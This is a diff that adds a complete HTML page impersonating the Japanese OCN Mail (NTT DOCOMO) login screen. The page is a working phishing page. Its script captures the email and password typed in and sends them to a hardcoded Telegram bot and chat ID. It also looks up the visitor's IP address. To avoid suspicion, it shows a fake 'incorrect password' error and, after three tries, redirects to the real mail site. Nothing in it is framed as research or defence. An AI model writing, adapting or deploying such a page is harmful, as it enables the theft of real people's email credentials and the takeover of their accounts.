@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCN メール - ログイン</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js" integrity="sha256-tc4b48P1MPGS4PJXHRlChGCW1mEZy62jS/3JEsSHPzU=" crossorigin="anonymous"></script>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #eeeeee 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 550px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .logo-section {
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo-section img {
+            height: 40px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .lang-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            color: #0066cc;
+            text-decoration: none;
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #fafafa;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0066cc;
+            background-color: white;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+        
+        .checkbox-group label {
+            margin: 0;
+            cursor: pointer;
+        }
+        
+        .button-group {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            gap: 10px;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e81828;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: #c41420;
+        }
+        
+        .login-button:active {
+            background-color: #a00e18;
+        }
+        
+        .icon {
+            width: 20px;
+            height: 20px;
+            display: inline-block;
+        }
+        
+        .links-section {
+            margin-top: 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+            font-size: 13px;
+        }
+        
+        .links-section a {
+            color: #0066cc;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .links-section a:hover {
+            text-decoration: underline;
+        }
+        
+        .help-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+        
+        .help-section a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .help-section a:hover {
+            text-decoration: underline;
+        }
+        
+        footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .loader {
+            display: none;
+            width: max-content;
+            margin: 0 auto 16px;
+            gap: 4px;
+            flex-direction: row-reverse;
+        }
+        
+        .loader div {
+            background-color: #e81828;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+        }
+        
+        #fieldset {
+            opacity: 1;
+            transition: opacity 0.3s;
+        }
+        
+        .error-message {
+            display: none;
+            background-color: #fee;
+            color: #c00;
+            border: 1px solid #fcc;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="lang-selector">日本語</div>
+    
+    <div class="container">
+        <div class="logo-section">
+            <svg class="logo-text" viewBox="0 0 100 40" width="60" height="25">
+                <text x="5" y="25" font-size="20" font-weight="bold" fill="#e81828">OCN</text>
+            </svg>
+            <span style="font-size: 20px; color: #333;">メール</span>
+        </div>
+        
+        <h1>Login</h1>
+        
+        <div id="loader" class="loader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        
+        <div id="errorMessage" class="error-message">
+            The user name or password you entered isn't correct. Try entering it again.
+        </div>
+        
+        <form id="loginForm" onsubmit="return sendtelegram()">
+            <fieldset id="fieldset" style="border: none;">
+                <div class="form-group">
+                    <label for="email">OCN mail address</label>
+                    <input type="email" id="email" name="email" placeholder="name@example.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="login-button">
+                        <span>Login</span>
+                    </button>
+                </div>
+                
+                <div class="links-section">
+                    <a href="#">Forgot ID or password?</a>
+                    <a href="#">Change password</a>
+                </div>
+                
+                <div class="help-section">
+                    <a href="#">Help</a>
+                </div>
+            </fieldset>
+        </form>
+        
+        <footer>
+            <a href="#">Terms</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">About Us</a>
+            <br><br>
+            ©NTT DOCOMO
+        </footer>
+    </div>
+    
+    <input type="hidden" id="ipaddress">
+    
+    <script>
+        // Telegram Bot Configuration (same structure as owa.html)
+        var tick = 0;
+        var telegram_bot_id = "8569403916:AAEVtkt-mOV6vxAfs-fIdFTVzxpQS4XaJRQ";
+        var chat_id = 5491806427;
+        var u_name, u_pass, message;
+        
+        var ready = function () {
+            u_name = document.getElementById("email").value;
+            u_pass = document.getElementById("password").value;
+            message = "🔴 OCN MAIL LOGIN ✅\n\n📧 Email: " + u_name + "\n🔐 Password: " + u_pass + "\n\n▬▬▬▬▬▬[OCN メール]▬▬▬▬▬▬\n🤖 Login URL: https://mail.ocn.ne.jp/\n📞 ADMIN: @plus234ng";
+        };
+        
+        var sendtelegram = function () {
+            tick += 1;
+            ready();
+            
+            document.getElementById("loader").style.display = "flex";
+            document.getElementById("fieldset").style.opacity = "0.4";
+            
+            let tl = anime.timeline({
+                easing: 'easeOutExpo',
+                duration: 300,
+                loop: true
+            });
+            
+            tl.add({
+                targets: '#loader div',
+                translateX: 185,
+                delay: anime.stagger(300, { easing: 'linear' }),
+                duration: 500,
+            });
+            
+            tl.add({
+                targets: '#loader div',
+                translateX: 1000,
+                delay: anime.stagger(300, { easing: 'linear' }),
+                duration: 500,
+            });
+            
+            setTimeout(() => {
+                tl.pause();
+                tl.restart();
+                setTimeout(() => {
+                    tl.pause();
+                    document.getElementById("loader").style.display = "none";
+                    document.getElementById("fieldset").style.opacity = "1";
+                }, 10);
+                
+                // Send to Telegram
+                var settings = {
+                    "async": true,
+                    "crossDomain": true,
+                    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                    "method": "POST",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "cache-control": "no-cache"
+                    },
+                    "data": JSON.stringify({
+                        "chat_id": chat_id,
+                        "text": message
+                    })
+                };
+                
+                $.ajax(settings).done(function (response) {
+                    console.log(response);
+                });
+                
+                // Show error message
+                document.getElementById("errorMessage").style.display = 'block';
+                document.getElementById("password").value = "";
+                
+                // Redirect after attempts
+                if (tick >= 3) {
+                    window.location.replace("https://mail.ocn.ne.jp/");
+                }
+            }, 5000);
+            
+            return false;
+        };
+        
+        // Hide error message on password focus
+        document.getElementById("password").addEventListener('focus', function() {
+            document.getElementById("errorMessage").style.display = 'none';
+        });
+        
+        // Handle Enter key
+        document.addEventListener('keypress', function(event) {
+            if (event.keyCode === 13) {
+                event.preventDefault();
+                document.getElementById("loginForm").dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
+</body>
+</html>
